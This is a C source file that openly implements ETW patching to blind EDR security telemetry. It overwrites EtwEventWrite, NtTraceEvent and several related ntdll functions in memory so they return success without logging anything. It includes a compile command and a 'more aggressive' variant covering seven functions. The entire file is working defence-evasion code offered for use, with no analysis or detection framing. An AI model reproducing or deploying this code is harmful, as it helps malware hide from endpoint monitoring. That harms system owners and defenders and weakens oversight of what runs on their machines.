/*
 * ETW Patching — blind EDR telemetry by patching EtwEventWrite
 *
 * Patches EtwEventWrite in ntdll.dll to immediately return 0 (STATUS_SUCCESS),
 * preventing the EDR from receiving event trace data about process behavior.
 * Also patches NtTraceEvent as a secondary measure.
 *
 * Compile: x86_64-w64-mingw32-gcc -c etw_patch.c -o etw_patch.o
 */

#include <windows.h>

/*
 * patch_function_to_ret0 — overwrite the first bytes of a function
 * to make it return 0 immediately.
 *
 * x64 patch: xor eax, eax (2 bytes: 33 C0) + ret (1 byte: C3) = 3 bytes
 */
static BOOL patch_function_to_ret0(void *func_addr) {
    if (!func_addr) return FALSE;

    DWORD old_protect;
    if (!VirtualProtect(func_addr, 4, PAGE_EXECUTE_READWRITE, &old_protect))
        return FALSE;

    /* 33 C0 = xor eax, eax ; C3 = ret */
    BYTE patch[] = { 0x33, 0xC0, 0xC3 };
    memcpy(func_addr, patch, sizeof(patch));

    VirtualProtect(func_addr, 4, old_protect, &old_protect);
    return TRUE;
}

/*
 * patch_etw — disable ETW event logging by patching EtwEventWrite
 * and NtTraceEvent in ntdll.dll.
 *
 * Returns the number of functions successfully patched (0-2).
 */
int patch_etw(void) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return 0;

    int patched = 0;

    void *etw_write = (void *)GetProcAddress(ntdll, "EtwEventWrite");
    if (etw_write && patch_function_to_ret0(etw_write))
        patched++;

    void *nt_trace = (void *)GetProcAddress(ntdll, "NtTraceEvent");
    if (nt_trace && patch_function_to_ret0(nt_trace))
        patched++;

    return patched;
}

/*
 * patch_etw_ntdll_full — more aggressive: also patches EtwEventWriteFull,
 * EtwEventWriteEx, and EtwEventWriteTransfer for completeness.
 */
int patch_etw_full(void) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return 0;

    const char *targets[] = {
        "EtwEventWrite",
        "EtwEventWriteFull",
        "EtwEventWriteEx",
        "EtwEventWriteTransfer",
        "EtwEventWriteNoRegistration",
        "NtTraceEvent",
        "NtTraceControl",
    };

    int patched = 0;
    for (int i = 0; i < (int)(sizeof(targets) / sizeof(targets[0])); i++) {
        void *addr = (void *)GetProcAddress(ntdll, targets[i]);
        if (addr && patch_function_to_ret0(addr))
            patched++;
    }

    return patched;
}
